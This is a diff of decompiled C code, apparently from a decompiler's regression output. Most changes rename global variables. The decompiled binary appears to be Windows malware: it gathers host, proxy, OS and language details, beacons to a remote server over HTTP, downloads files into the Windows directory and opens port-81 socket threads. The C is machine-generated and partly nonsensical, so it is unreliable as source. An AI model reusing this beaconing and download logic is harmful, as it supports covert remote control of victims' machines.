     *(int32_t *)(g8 - 8) = v7;
     strcat((char *)dwMilliseconds2, (char *)dwMilliseconds);
     *(int32_t *)(g8 + 24) = v7;
@@ -1338,7 +1356,7 @@ int32_t function_4016a4(void) {
     if (lstrcmpiA((char *)dwMilliseconds2, (char *)dwMilliseconds) == 0) {
         // 0x4018ab
         *(int32_t *)(g8 - 4) = 1;
-        *(int32_t *)(g8 - 8) = (int32_t)&g50;
+        *(int32_t *)(g8 - 8) = (int32_t)&g55;
         function_4015d4((char *)dwMilliseconds2, (int32_t)dwMilliseconds);
         *(int32_t *)(g8 - 4) = 1;
         int32_t result = function_401454((int32_t)dwMilliseconds2); // 0x4018b5
@@ -1376,7 +1394,7 @@ int32_t function_4018c1(struct _OSVERSIONINFOA * lpVersionInformation) {
         // branch -> 0x4018f0
     }
     int16_t langId = GetSystemDefaultLangID(); // 0x4018f0
-    g64 = langId;
+    g69 = langId;
     return langId;
 }
 
@@ -1394,7 +1412,7 @@ int32_t function_4018ff(void) {
         return 0;
     }
     int32_t * lpReserved = (int32_t *)v1; // 0x40194c
-    int32_t v3 = RegQueryValueExA((int32_t *)phkResult, "ProxyEnable", lpReserved, lpReserved, (char *)&g62, &lpcbData); // 0x40194c
+    int32_t v3 = RegQueryValueExA((int32_t *)phkResult, "ProxyEnable", lpReserved, lpReserved, (char *)&g67, &lpcbData); // 0x40194c
     lpcbData = 256;
     int32_t * lpReserved2 = (int32_t *)v1; // 0x40196c
     int32_t lpData; // bp-268
@@ -1402,7 +1420,7 @@ int32_t function_4018ff(void) {
     int32_t hKey = phkResult; // 0x40196e
     int32_t v5 = hKey; // bp-352
     RegCloseKey((int32_t *)hKey);
-    if (v3 != v1 || v4 != v1 || (int32_t)g62 == v1) {
+    if (v3 != v1 || v4 != v1 || (int32_t)g67 == v1) {
         // 0x4019db
         // branch -> 0x4019dd
         // 0x4019dd
@@ -1421,8 +1439,8 @@ int32_t function_4018ff(void) {
     }
     char * found_char_pos = strchr((char *)str, 58); // 0x4019b1
     *found_char_pos = (char)v1;
-    strcpy((char *)&g60, (char *)str);
-    g61 = atoi((char *)((int32_t)found_char_pos + 1));
+    strcpy((char *)&g65, (char *)str);
+    g66 = atoi((char *)((int32_t)found_char_pos + 1));
     // branch -> 0x4019dd
     // 0x4019dd
     g5 = *(int32_t *)(int32_t)&v5;
@@ -1466,7 +1484,7 @@ int32_t function_4019e2(struct timeval * a1, int32_t a2, int32_t a3, int32_t a4,
         v2 = 60;
         char * v10 = (char *)1; // bp-300
         int32_t v11;
-        if ((int32_t)g62 == g3) {
+        if ((int32_t)g67 == g3) {
             // 0x401a6e
             g5 = 0;
             v11 = (int32_t)timeout;
@@ -1474,7 +1492,7 @@ int32_t function_4019e2(struct timeval * a1, int32_t a2, int32_t a3, int32_t a4,
         } else {
             // 0x401a5e
             g5 = inet_addr((char *)1);
-            v11 = g61;
+            v11 = g66;
             // branch -> 0x401a74
         }
         // 0x401a74
@@ -1657,11 +1675,11 @@ int32_t function_401bab(void) {
     g4 = 0x3e800;
     int32_t result;
     if (mem != NULL) {
-        int32_t v5 = function_4019e2((struct timeval *)&g52, 80, (int32_t)&g49, (int32_t)&g74, 0, v4, (int32_t)&v1, 0); // 0x401bdf
+        int32_t v5 = function_4019e2((struct timeval *)&g57, 80, (int32_t)&g54, (int32_t)&g79, 0, v4, (int32_t)&v1, 0); // 0x401bdf
         int32_t * v6 = (int32_t *)g7;
         if (v5 != 0) {
             // 0x401beb
-            g39 = (struct _SECURITY_ATTRIBUTES *)*v6;
+            g44 = (struct _SECURITY_ATTRIBUTES *)*v6;
             g5 = 1;
             // branch -> 0x401bf5
         }
@@ -1705,17 +1723,17 @@ int32_t function_401c03(void) {
     // 0x401c47
     v3 = g5;
     int32_t str = 0; // bp-1296
-    strcpy((char *)&str, (char *)&g68);
-    int32_t len = strlen((char *)(int32_t)&g68); // 0x401c5b
-    strcpy((char *)(len - 1291 + g2), (char *)&g67);
-    int32_t v5 = strlen((char *)(int32_t)&g67) + 1 + len + 1; // 0x401c7c
-    memcpy((int32_t *)(v5 - 1292 + g2), &g65, 156);
+    strcpy((char *)&str, (char *)&g73);
+    int32_t len = strlen((char *)(int32_t)&g73); // 0x401c5b
+    strcpy((char *)(len - 1291 + g2), (char *)&g72);
+    int32_t v5 = strlen((char *)(int32_t)&g72) + 1 + len + 1; // 0x401c7c
+    memcpy((int32_t *)(v5 - 1292 + g2), &g70, 156);
     int32_t v6 = 156 + v5; // 0x401c9e
     int32_t str2 = (int32_t)"10.14"; // edi
-    *(int16_t *)(v6 - 1292 + g2) = g64;
-    *(char *)(v6 - 1290 + g2) = (char)(g62 != NULL);
+    *(int16_t *)(v6 - 1292 + g2) = g69;
+    *(char *)(v6 - 1290 + g2) = (char)(g67 != NULL);
     int32_t v7 = v6 + 2; // 0x401cc6
-    *(int32_t *)(v7 - 1291 + g2) = g38;
+    *(int32_t *)(v7 - 1291 + g2) = g43;
     int32_t v8 = v7 + 1; // 0x401cce
     strcpy((char *)(v8 - 1288 + g2), (char *)str2);
     uint32_t len2 = strlen((char *)str2); // 0x401cdf
@@ -1727,12 +1745,12 @@ int32_t function_401c03(void) {
     sprintf((char *)&str3, "%u:%u", len2 / 0x36ee80, v10 / 0xea60);
     strcpy((char *)(g2 - 1292 + v9), (char *)&str3);
     g7 = strlen((char *)&str3) + 1 + v9;
-    strcpy((char *)&str3, (char *)&g49);
+    strcpy((char *)&str3, (char *)&g54);
     char * found_char_pos = strrchr((char *)&str3, 47); // 0x401d5d
-    g5 = (int32_t)&g52;
+    g5 = (int32_t)&g57;
     int32_t str4 = g2 - 1292 + g7; // 0x401d68
     g3 = str4;
-    strcpy((char *)str4, (char *)&g52);
+    strcpy((char *)str4, (char *)&g57);
     int32_t v11; // 0x401dbf
     if (found_char_pos == NULL) {
         // 0x401c47
@@ -1750,13 +1768,13 @@ int32_t function_401c03(void) {
     }
     int32_t v13 = 0; // bp-16
     char * v14 = (char *)&v13; // bp-1332
-    struct _SECURITY_ATTRIBUTES * v15 = g39; // 0x401dc8
+    struct _SECURITY_ATTRIBUTES * v15 = g44; // 0x401dc8
     in = (struct in_addr){
         .e0 = 0
     };
     in.e0 = (int32_t)v15;
     char * v16 = inet_ntoa(in); // 0x401dce
-    int32_t result = function_4019e2((struct timeval *)v16, (int32_t)v15, 80, (int32_t)&g74, (int32_t)&str, (int32_t)(char *)v11, (int32_t)(char *)mem, (int32_t)v14); // 0x401dd5
+    int32_t result = function_4019e2((struct timeval *)v16, (int32_t)v15, 80, (int32_t)&g79, (int32_t)&str, (int32_t)(char *)v11, (int32_t)(char *)mem, (int32_t)v14); // 0x401dd5
     free(mem);
     g5 = 1;
     v4 = &v3;
@@ -1780,7 +1798,7 @@ int32_t function_401def(void) {
     g4 = 0x3e800;
     int32_t result;
     if (mem != NULL) {
-        int32_t v5 = function_4019e2((struct timeval *)&g52, 80, (int32_t)&g48, (int32_t)&g74, 0, v4, (int32_t)&v1, 0); // 0x401e25
+        int32_t v5 = function_4019e2((struct timeval *)&g57, 80, (int32_t)&g53, (int32_t)&g79, 0, v4, (int32_t)&v1, 0); // 0x401e25
         if (v5 != 0) {
             // 0x401e31
             g5 = function_401e4c(g7, v1);
@@ -1810,9 +1828,9 @@ int32_t function_401e4c(int32_t a1, int32_t a2) {
     int32_t v2 = (int32_t)&str; // 0x401e54
     int32_t v3; // 0x401e79
     if (a2 > 0) {
-        int32_t v4 = (int32_t)&g68; // esi
+        int32_t v4 = (int32_t)&g73; // esi
         int32_t v5 = v2; // 0x401e63
-        int32_t v6 = (int32_t)&g68; // 0x401e63
+        int32_t v6 = (int32_t)&g73; // 0x401e63
         int32_t v7 = 0; // 0x401e60
         // branch -> 0x401e60
         while (true) {
@@ -1829,7 +1847,7 @@ int32_t function_401e4c(int32_t a1, int32_t a2) {
                 // 0x401e79
                 g7 = *(int32_t *)(v3 + 4);
                 g3 = *(int32_t *)(v3 + 8);
-                return v9 == g38;
+                return v9 == g43;
             }
             int32_t v10 = v1 + 1; // 0x401e70
             v1 = v10;
@@ -1869,13 +1887,13 @@ int32_t function_401e99(int32_t a1, int32_t a2) {
     int32_t v2 = 0; // ebx
     int32_t v3 = 2 * (g2 + 0x3a98 + 4 * g2); // esi
     int32_t v4 = 0; // ebp
-    g35 = v1;
+    g40 = v1;
     int32_t v5; // 0x401f33
     int32_t v6; // 0x401f36
     int32_t result; // 0x401f3a
     if (g2 > 0) {
         // 0x401edb
-        if (g26 == 0) {
+        if (g31 == 0) {
             int32_t v7 = 0; // 0x401ee530
             int32_t v8 = g2; // 0x401ee329
             while (true) {
@@ -1883,7 +1901,7 @@ int32_t function_401e99(int32_t a1, int32_t a2) {
                 *(int32_t *)(g8 - 4) = v7;
                 *(int32_t *)(g8 - 8) = v8 - v2;
                 *(int32_t *)(g8 - 12) = v2 + *(int32_t *)(g8 + 20);
-                *(int32_t *)(g8 - 16) = (int32_t)g36;
+                *(int32_t *)(g8 - 16) = (int32_t)g41;
                 int32_t v9 = send(sock, (char *)moduleHandle, (int32_t)"GetTickCount", (int32_t)flags); // 0x401ef6
                 int32_t v10; // 0x401f2f
                 int32_t v11; // 0x401f1f
@@ -1904,7 +1922,7 @@ int32_t function_401e99(int32_t a1, int32_t a2) {
                         }
                     }
                     // 0x401f3b
-                    g71 = v4;
+                    g76 = v4;
                     // branch -> 0x401f41
                     // 0x401f41
                     v6 = g8;
@@ -1938,7 +1956,7 @@ int32_t function_401e99(int32_t a1, int32_t a2) {
                     return 1;
                 }
                 // 0x401f2f
-                if (g26 != v4) {
+                if (g31 != v4) {
                     // break -> 0x401f41
                     break;
                 }
@@ -2010,9 +2028,9 @@ int32_t function_401f45(char * a1, int32_t a2) {
         v7 = g8;
         *(int32_t *)(v7 + 8) = *(int32_t *)(g7 + 1);
         *(int32_t *)(v7 + 4) = 1;
-        *(int32_t *)v7 = (int32_t)&g74;
+        *(int32_t *)v7 = (int32_t)&g79;
         *(int32_t *)(v7 - 4) = 81;
-        *(int32_t *)(v7 - 8) = (int32_t)g39;
+        *(int32_t *)(v7 - 8) = (int32_t)g44;
         in = (struct in_addr){
             .e0 = 0
         };
@@ -2051,19 +2069,19 @@ int32_t function_401f45(char * a1, int32_t a2) {
         return result;
     }
     // 0x401f5a
-    if (g56 != 0) {
-        int32_t v15 = *(int32_t *)&g36; // 0x401f621
+    if (g61 != 0) {
+        int32_t v15 = *(int32_t *)&g41; // 0x401f622
         str = NULL;
         *(int32_t *)&str = v15;
-        g54 = 1;
-        g53 = 0;
+        g59 = 1;
+        g58 = 0;
         closesocket(v15);
         int32_t v16; // 0x401f90
         int32_t v17;
-        if (g53 == g3) {
+        if (g58 == g3) {
             *(int32_t *)(g8 - 4) = 1;
             Sleep((int32_t)str);
-            while (g53 == g3) {
+            while (g58 == g3) {
                 // 0x401f86
                 *(int32_t *)(g8 - 4) = 1;
                 Sleep((int32_t)str);
@@ -2083,9 +2101,9 @@ int32_t function_401f45(char * a1, int32_t a2) {
                 v7 = g8;
                 *(int32_t *)(v7 + 8) = *(int32_t *)(g7 + 1);
                 *(int32_t *)(v7 + 4) = 1;
-                *(int32_t *)v7 = (int32_t)&g74;
+                *(int32_t *)v7 = (int32_t)&g79;
                 *(int32_t *)(v7 - 4) = 81;
-                *(int32_t *)(v7 - 8) = (int32_t)g39;
+                *(int32_t *)(v7 - 8) = (int32_t)g44;
                 in = (struct in_addr){
                     .e0 = 0
                 };
@@ -2150,9 +2168,9 @@ int32_t function_401f45(char * a1, int32_t a2) {
     v7 = g8;
     *(int32_t *)(v7 + 8) = *(int32_t *)(g7 + 1);
     *(int32_t *)(v7 + 4) = 1;
-    *(int32_t *)v7 = (int32_t)&g74;
+    *(int32_t *)v7 = (int32_t)&g79;
     *(int32_t *)(v7 - 4) = 81;
-    *(int32_t *)(v7 - 8) = (int32_t)g39;
+    *(int32_t *)(v7 - 8) = (int32_t)g44;
     in = (struct in_addr){
         .e0 = 0
     };
@@ -2205,11 +2223,11 @@ int32_t function_402006(void) {
         return result;
     }
     // 0x40201a
-    g7 = (int32_t)&g51;
-    int32_t v3 = function_4019e2((struct timeval *)&g51, 80, (int32_t)&g42, (int32_t)&g74, 0, result, (int32_t)&v1, 0); // 0x402037
+    g7 = (int32_t)&g56;
+    int32_t v3 = function_4019e2((struct timeval *)&g56, 80, (int32_t)&g47, (int32_t)&g79, 0, result, (int32_t)&v1, 0); // 0x402037
     if (v3 != 0) {
         // 0x402043
-        strcpy((char *)&g52, (char *)g7);
+        strcpy((char *)&g57, (char *)g7);
         // branch -> 0x402050
     }
     // 0x402050
@@ -2234,9 +2252,9 @@ int32_t function_40205c(void) {
         int32_t nNumberOfBytesToWrite; // bp-12
         int32_t v3 = &nNumberOfBytesToWrite; // 0x402084
         g4 = v3;
-        g5 = (int32_t)&g74;
-        g7 = (int32_t)&g52;
-        int32_t v4 = function_4019e2((struct timeval *)&g52, 80, (int32_t)&g47, (int32_t)&g74, 0, v2, v3, 0); // 0x40209e
+        g5 = (int32_t)&g79;
+        g7 = (int32_t)&g57;
+        int32_t v4 = function_4019e2((struct timeval *)&g57, 80, (int32_t)&g52, (int32_t)&g79, 0, v2, v3, 0); // 0x40209e
         int32_t v5; // bp-1116
         if (v4 != 0) {
             // 0x4020ae
@@ -2244,7 +2262,7 @@ int32_t function_40205c(void) {
             g4 = (int32_t)"10.14";
             if (strcmp((char *)mem, "10.14") != 0) {
                 int32_t v6 = g3; // 0x4020cf
-                int32_t v7 = function_4019e2((struct timeval *)g7, 80, (int32_t)&g46, g5, v6, v2, v3, v6); // 0x4020de
+                int32_t v7 = function_4019e2((struct timeval *)g7, 80, (int32_t)&g51, g5, v6, v2, v3, v6); // 0x4020de
                 if (v7 != 0) {
                     // 0x4020ea
                     int32_t lpBuffer; // bp-1040
@@ -2307,8 +2325,8 @@ int32_t function_40216f(void) {
         // 0x40218f
         char * c; // bp-8
         int32_t v7 = (int32_t)&c; // 0x40218f
-        g5 = (int32_t)&g74;
-        int32_t v8 = function_4019e2((struct timeval *)&g52, 80, (int32_t)&g41, (int32_t)&g74, 0, v5, v7, 0); // 0x4021a8
+        g5 = (int32_t)&g79;
+        int32_t v8 = function_4019e2((struct timeval *)&g57, 80, (int32_t)&g46, (int32_t)&g79, 0, v5, v7, 0); // 0x4021a8
         char * v9;
         int32_t v10; // 0x4022e3
         if (v8 != 0) {
@@ -2319,7 +2337,7 @@ int32_t function_40216f(void) {
             g4 = (int32_t)str2;
             if (strcmp_rc != 0) {
                 int32_t v11 = g3; // 0x4021d6
-                int32_t v12 = function_4019e2((struct timeval *)&g52, 80, (int32_t)&g40, g5, v11, g7, v7, v11); // 0x4021e7
+                int32_t v12 = function_4019e2((struct timeval *)&g57, 80, (int32_t)&g45, g5, v11, g7, v7, v11); // 0x4021e7
                 if (v12 != 0) {
                     int32_t v13 = g7; // 0x4021fd
                     g5 = v13 - 2;
@@ -2353,7 +2371,7 @@ int32_t function_40216f(void) {
                                     // branch -> 0x402231
                                 }
                                 // 0x402231
-                                *(int32_t *)(v20 - 4) = (int32_t)&g68;
+                                *(int32_t *)(v20 - 4) = (int32_t)&g73;
                                 *(int32_t *)(v20 - 8) = hFile;
                                 int32_t strcmp_rc2 = strcmp(str3, c); // 0x402239
                                 v16 = (int32_t *)(g8 + 4);
@@ -2387,10 +2405,10 @@ int32_t function_40216f(void) {
                     *(int32_t *)g8 = v7;
                     *(int32_t *)(g8 - 4) = g7;
                     *(int32_t *)(g8 - 8) = g3;
-                    *(int32_t *)(g8 - 12) = (int32_t)&g74;
-                    *(int32_t *)(g8 - 16) = (int32_t)&g46;
+                    *(int32_t *)(g8 - 12) = (int32_t)&g79;
+                    *(int32_t *)(g8 - 16) = (int32_t)&g51;
                     *(int32_t *)(g8 - 20) = 80;
-                    *(int32_t *)(g8 - 24) = (int32_t)&g52;
+                    *(int32_t *)(g8 - 24) = (int32_t)&g57;
                     struct _SECURITY_ATTRIBUTES * lpSecurityAttributes = NULL;
                     int32_t * dwCreationDisposition;
                     int32_t v21 = function_4019e2((struct timeval *)hFile, (int32_t)c, dwShareMode, (int32_t)lpSecurityAttributes, (int32_t)&dwCreationDisposition, (int32_t)&dwCreationDisposition, (int32_t)&dwCreationDisposition, (int32_t)&dwCreationDisposition); // 0x40225c
@@ -2494,7 +2512,7 @@ int32_t function_4022eb(void) {
     if (mem != NULL) {
         // 0x40230f
         int32_t nNumberOfBytesToWrite; // bp-12
-        int32_t v6 = function_4019e2((struct timeval *)&g52, 80, (int32_t)&g45, (int32_t)&g74, 0, v4, (int32_t)&nNumberOfBytesToWrite, 0); // 0x402327
+        int32_t v6 = function_4019e2((struct timeval *)&g57, 80, (int32_t)&g50, (int32_t)&g79, 0, v4, (int32_t)&nNumberOfBytesToWrite, 0); // 0x402327
         if (v6 != 0) {
             int32_t lpBuffer = 0; // bp-1040
             GetWindowsDirectoryA((char *)&lpBuffer, 1024);
@@ -2579,7 +2597,7 @@ int32_t function_4023c2(void) {
     // 0x4023e6
     char * c; // bp-8
     int32_t v6 = (int32_t)&c; // 0x4023e6
-    int32_t v7 = function_4019e2((struct timeval *)&g52, 80, (int32_t)&g43, (int32_t)&g74, 0, v5, v6, 0); // 0x4023fe
+    int32_t v7 = function_4019e2((struct timeval *)&g57, 80, (int32_t)&g48, (int32_t)&g79, 0, v5, v6, 0); // 0x4023fe
     int32_t v8; // 0x40250310
     if (v7 != 0) {
         int32_t v9 = g7; // 0x402411
@@ -2614,7 +2632,7 @@ int32_t function_4023c2(void) {
                         // branch -> 0x40243d
                     }
                     // 0x40243d
-                    *(int32_t *)(v16 - 4) = (int32_t)&g68;
+                    *(int32_t *)(v16 - 4) = (int32_t)&g73;
                     *(int32_t *)(v16 - 8) = hFile;
                     int32_t strcmp_rc = strcmp(str, c); // 0x402445
                     v11 = (int32_t *)(g8 + 4);
@@ -2646,10 +2664,10 @@ int32_t function_4023c2(void) {
         *(int32_t *)g8 = v6;
         *(int32_t *)(g8 - 4) = g7;
         *(int32_t *)(g8 - 8) = g3;
-        *(int32_t *)(g8 - 12) = (int32_t)&g74;
-        *(int32_t *)(g8 - 16) = (int32_t)&g44;
+        *(int32_t *)(g8 - 12) = (int32_t)&g79;
+        *(int32_t *)(g8 - 16) = (int32_t)&g49;
         *(int32_t *)(g8 - 20) = 80;
-        *(int32_t *)(g8 - 24) = (int32_t)&g52;
+        *(int32_t *)(g8 - 24) = (int32_t)&g57;
         struct _SECURITY_ATTRIBUTES * lpSecurityAttributes = NULL;
         int32_t * dwCreationDisposition;
         int32_t v17 = function_4019e2((struct timeval *)hFile, (int32_t)c, dwShareMode, (int32_t)lpSecurityAttributes, (int32_t)&dwCreationDisposition, (int32_t)&dwCreationDisposition, (int32_t)&dwCreationDisposition, (int32_t)&dwCreationDisposition); // 0x402470
@@ -2753,10 +2771,10 @@ int32_t function_402508(void) {
     // branch -> 0x4025a5
     while (true) {
       lab_0x4025a5:;
-        char * v2 = g36; // 0x4025a5
+        char * v2 = g41; // 0x4025a5
         int32_t v3 = (int32_t)v2; // 0x4025a5
-        g28 = 0;
-        g26 = 0;
+        g33 = 0;
+        g31 = 0;
         if (v2 != NULL) {
             // 0x4025bc
             *(int32_t *)(g8 - 4) = v3;
@@ -2764,8 +2782,8 @@ int32_t function_402508(void) {
             // branch -> 0x4025c3
         }
         // 0x4025c3
-        g36 = NULL;
-        g71 = 0;
+        g41 = NULL;
+        g76 = 0;
         *(int32_t *)(g8 - 4) = 50;
         Sleep((int32_t)dwMilliseconds);
         int32_t result = function_40205c(); // 0x4025d5
@@ -2792,10 +2810,10 @@ int32_t function_402508(void) {
                         lpThreadAttributes = (struct _SECURITY_ATTRIBUTES *)g5;
                         *(int32_t *)(g8 - 4) = v1;
                         *(int32_t *)(g8 - 8) = -0x7ffb9982;
-                        *(int32_t *)(g8 - 12) = (int32_t)g36;
+                        *(int32_t *)(g8 - 12) = (int32_t)g41;
                         int32_t (*lpStartAddress)(int32_t *) = NULL;
                         ioctlsocket((int32_t)lpThreadAttributes, dwStackSize, (int32_t *)lpStartAddress);
-                        g32 = 0;
+                        g37 = 0;
                         int32_t v4; // bp-12
                         *(int32_t *)(g8 - 4) = (int32_t)&v4;
                         int32_t v5 = 0; // eax
@@ -2804,20 +2822,20 @@ int32_t function_402508(void) {
                         *(int32_t *)(g8 - 16) = (int32_t)"SVWh v@";
                         *(int32_t *)(g8 - 20) = v5;
                         *(int32_t *)(g8 - 24) = v5;
-                        g71 = g5;
+                        g76 = g5;
                         int32_t * lpParameter;
                         CreateThread(lpThreadAttributes, dwStackSize, lpStartAddress, &lpParameter, (int32_t)&lpParameter, &lpParameter);
-                        g25 = (char *)g5;
+                        g30 = (char *)g5;
                         // branch -> 0x402658
                         while (true) {
                             // 0x402658
-                            if (g28 != 0) {
+                            if (g33 != 0) {
                                 // 0x402661
                                 function_402aa7();
                                 // branch -> 0x402666
                             }
                             // 0x402666
-                            if (g71 == 0) {
+                            if (g76 == 0) {
                                 goto lab_0x4025a5;
                             }
                             // 0x402673
@@ -2855,7 +2873,7 @@ int32_t function_40267d(char * str, int32_t str3) {
     int32_t str2 = (int32_t)str; // esi
     int32_t v3;
     strcpy(str, v3 != 0 ? "POST " : "GET ");
-    if (g62 != NULL) {
+    if (g67 != NULL) {
         // 0x4026c3
         strcat((char *)str2, "http://");
         strcat((char *)str2, (char *)str3);
@@ -3059,8 +3077,8 @@ int32_t function_402859(void) {
     struct in_addr in; // 0x4028b0
     int32_t v1 = g2; // 0x402859
     int32_t nSize = 255; // bp-8
-    GetComputerNameA((char *)&g68, &nSize);
-    g69 = 0;
+    GetComputerNameA((char *)&g73, &nSize);
+    g74 = 0;
     int32_t name = 0; // bp-264
     char * str2; // bp-288
     char * str; // bp-292
@@ -3069,10 +3087,10 @@ int32_t function_402859(void) {
     if (gethostname((char *)&name, 255) != 0) {
         // 0x4028b9
         v2 = g8 - 4;
-        *(int32_t *)v2 = (int32_t)&g74;
+        *(int32_t *)v2 = (int32_t)&g79;
         // branch -> 0x4028be
         // 0x4028be
-        *(int32_t *)(v2 - 4) = (int32_t)&g67;
+        *(int32_t *)(v2 - 4) = (int32_t)&g72;
         dest_str = strcpy(str, str2);
         g4 = *(int32_t *)(g8 + 4);
         g2 = v1;
@@ -3082,10 +3100,10 @@ int32_t function_402859(void) {
     if (v3 == NULL) {
         // 0x4028b9
         v2 = g8 - 4;
-        *(int32_t *)v2 = (int32_t)&g74;
+        *(int32_t *)v2 = (int32_t)&g79;
         // branch -> 0x4028be
         // 0x4028be
-        *(int32_t *)(v2 - 4) = (int32_t)&g67;
+        *(int32_t *)(v2 - 4) = (int32_t)&g72;
         dest_str = strcpy(str, str2);
         g4 = *(int32_t *)(g8 + 4);
         g2 = v1;
@@ -3101,7 +3119,7 @@ int32_t function_402859(void) {
     int32_t v5 = (int32_t)&str; // 0x4028b6
     // branch -> 0x4028be
     // 0x4028be
-    *(int32_t *)(v5 - 4) = (int32_t)&g67;
+    *(int32_t *)(v5 - 4) = (int32_t)&g72;
     dest_str = strcpy(str, (char *)str3);
     g4 = *(int32_t *)(g8 + 4);
     g2 = v1;
@@ -3159,7 +3177,7 @@ int32_t function_4028eb(void) {
     int32_t * threadHandle; // 0x402a81
     int32_t v19; // 0x402a81
     int32_t * addr;
-    if (g54 != 0) {
+    if (g59 != 0) {
         v9 = &v3;
         // 0x4029b0
         *(int32_t *)(v9 - 4) = 0;
@@ -3168,7 +3186,7 @@ int32_t function_4028eb(void) {
         struct fd_set * type;
         struct fd_set * protocol;
         sock_fd = socket(AF_UNSPEC, (int32_t)type, (int32_t)protocol);
-        g36 = (char *)sock_fd;
+        g41 = (char *)sock_fd;
         if (sock_fd == -1) {
             // 0x402a9c
             // branch -> 0x402aa2
@@ -3190,30 +3208,30 @@ int32_t function_4028eb(void) {
         *(int32_t *)(v10 - 12) = sock_fd;
         ioctlsocket(v5, v1, (int32_t *)0);
         timeout = 60;
-        v16 = (int32_t)g61 | (int32_t)g36 & -0x10000;
+        v16 = (int32_t)g66 | (int32_t)g41 & -0x10000;
         *(int32_t *)(g8 - 4) = v16;
         host_short = g7;
         writefds = host_short;
         addr2 = 2;
         v15 = htons(host_short);
-        *(int32_t *)(g8 - 4) = (int32_t)&g60;
+        *(int32_t *)(g8 - 4) = (int32_t)&g65;
         sock = inet_addr((char *)((int32_t)v15 & 0xffff));
         v17 = (struct _SECURITY_ATTRIBUTES *)sock;
         v6 = g8;
         *(int32_t *)(v6 - 4) = 16;
         *(int32_t *)(v6 - 8) = (int32_t)&addr2;
-        *(int32_t *)(v6 - 12) = (int32_t)g36;
+        *(int32_t *)(v6 - 12) = (int32_t)g41;
         connect(sock, (struct sockaddr *)&addr, (int32_t)&addr);
         v11 = g8;
         *(int32_t *)(v11 - 4) = (int32_t)&timeout;
         *(int32_t *)(v11 - 8) = g5;
         *(int32_t *)(v11 - 12) = v2;
         *(int32_t *)(v11 - 16) = g5;
-        *(int32_t *)(v11 - 20) = (int32_t)g36 + 1;
+        *(int32_t *)(v11 - 20) = (int32_t)g41 + 1;
         v18 = select(sock, (struct fd_set *)&addr, (struct fd_set *)&addr, (struct fd_set *)&addr, (struct timeval *)&addr);
         if (v18 < 1) {
             // 0x402a90
-            *(int32_t *)(g8 - 4) = (int32_t)g36;
+            *(int32_t *)(g8 - 4) = (int32_t)g41;
             closesocket((int32_t)v17);
             // branch -> 0x402a9c
             // 0x402a9c
@@ -3227,19 +3245,19 @@ int32_t function_4028eb(void) {
             return 0;
         }
         // 0x402a47
-        g56 = g7;
+        g61 = g7;
         lpThreadAttributes = v17;
         // branch -> 0x402a4d
         // 0x402a4d
         v12 = g5;
-        if (g54 != v12) {
+        if (g59 != v12) {
             // 0x402a5e
-            v7 = g72;
+            v7 = g77;
             if (v7 != v12) {
                 // 0x402a67
                 *(int32_t *)(g8 - 4) = v7;
                 CloseHandle(&lpThreadAttributes->e0);
-                g72 = g5;
+                g77 = g5;
                 // branch -> 0x402a74
             }
             // 0x402a74
@@ -3252,14 +3270,14 @@ int32_t function_4028eb(void) {
             *(int32_t *)(v13 - 24) = g5;
             threadHandle = CreateThread(lpThreadAttributes, (int32_t)&addr, (int32_t (*)(int32_t *))&addr, &addr, (int32_t)&addr, &addr);
             v19 = (int32_t)threadHandle;
-            g72 = v19;
+            g77 = v19;
             if (v19 != g5) {
                 // 0x402aa0
                 result = g7;
                 // branch -> 0x402aa2
             } else {
                 // 0x402a90
-                *(int32_t *)(g8 - 4) = (int32_t)g36;
+                *(int32_t *)(g8 - 4) = (int32_t)g41;
                 closesocket((int32_t)lpThreadAttributes);
                 // branch -> 0x402a9c
                 // 0x402a9c
@@ -3289,12 +3307,12 @@ int32_t function_4028eb(void) {
         // 0x402a55
         // branch -> 0x402a5e
         // 0x402a5e
-        v7 = g72;
+        v7 = g77;
         if (v7 != g5) {
             // 0x402a67
             *(int32_t *)(g8 - 4) = v7;
             CloseHandle(&lpThreadAttributes->e0);
-            g72 = g5;
+            g77 = g5;
             // branch -> 0x402a74
         }
         // 0x402a74
@@ -3307,14 +3325,14 @@ int32_t function_4028eb(void) {
         *(int32_t *)(v13 - 24) = g5;
         threadHandle = CreateThread(lpThreadAttributes, (int32_t)&addr, (int32_t (*)(int32_t *))&addr, &addr, (int32_t)&addr, &addr);
         v19 = (int32_t)threadHandle;
-        g72 = v19;
+        g77 = v19;
         if (v19 != g5) {
             // 0x402aa0
             result = g7;
             // branch -> 0x402aa2
         } else {
             // 0x402a90
-            *(int32_t *)(g8 - 4) = (int32_t)g36;
+            *(int32_t *)(g8 - 4) = (int32_t)g41;
             closesocket((int32_t)lpThreadAttributes);
             // branch -> 0x402a9c
             // 0x402a9c
@@ -3330,9 +3348,9 @@ int32_t function_4028eb(void) {
         return result;
     }
     // 0x40290e
-    g56 = 0;
+    g61 = 0;
     int32_t sock_fd2 = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0x402918
-    g36 = (char *)sock_fd2;
+    g41 = (char *)sock_fd2;
     if (sock_fd2 == -1) {
         // 0x402a9c
         // branch -> 0x402aa2
@@ -3352,22 +3370,22 @@ int32_t function_4028eb(void) {
     writefds = g7;
     addr2 = 2;
     htons(81);
-    connect(*(int32_t *)&g36, (struct sockaddr *)&addr2, 16);
+    connect(*(int32_t *)&g41, (struct sockaddr *)&addr2, 16);
     struct fd_set * readfds = (struct fd_set *)g5; // 0x40298c
-    int32_t nfds = (int32_t)g36 + 1; // 0x402994
+    int32_t nfds = (int32_t)g41 + 1; // 0x402994
     int32_t v20 = select(nfds, readfds, (struct fd_set *)&writefds, readfds, (struct timeval *)&timeout); // 0x402996
     if (v20 >= 0 == (v20 != 0)) {
-        lpThreadAttributes = g39;
+        lpThreadAttributes = g44;
         // 0x402a4d
         v12 = g5;
-        if (g54 != v12) {
+        if (g59 != v12) {
             // 0x402a5e
-            v7 = g72;
+            v7 = g77;
             if (v7 != v12) {
                 // 0x402a67
                 *(int32_t *)(g8 - 4) = v7;
                 CloseHandle(&lpThreadAttributes->e0);
-                g72 = g5;
+                g77 = g5;
                 // branch -> 0x402a74
             }
             // 0x402a74
@@ -3380,14 +3398,14 @@ int32_t function_4028eb(void) {
             *(int32_t *)(v13 - 24) = g5;
             threadHandle = CreateThread(lpThreadAttributes, (int32_t)&addr, (int32_t (*)(int32_t *))&addr, &addr, (int32_t)&addr, &addr);
             v19 = (int32_t)threadHandle;
-            g72 = v19;
+            g77 = v19;
             if (v19 != g5) {
                 // 0x402aa0
                 result = g7;
                 // branch -> 0x402aa2
             } else {
                 // 0x402a90
-                *(int32_t *)(g8 - 4) = (int32_t)g36;
